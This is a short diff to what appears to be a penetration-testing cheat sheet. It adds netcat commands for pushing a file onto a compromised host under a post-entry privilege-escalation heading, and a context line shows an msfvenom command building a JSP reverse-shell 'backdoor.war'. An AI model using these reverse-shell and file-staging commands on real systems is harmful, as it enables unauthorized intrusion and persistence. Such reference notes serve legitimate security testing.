@@ -124,6 +124,18 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4449 -f war > backdoor.war
 
 ## Attempt to Elevate permissions after entry
 
+### Download file to remote host
+
+Host:
+```
+nc -l PORT < /path/to/file
+```
+
+Client:
+```
+nc IP PORT > file
+```
+
 ### Open SSH through Metasploit
 
 ```
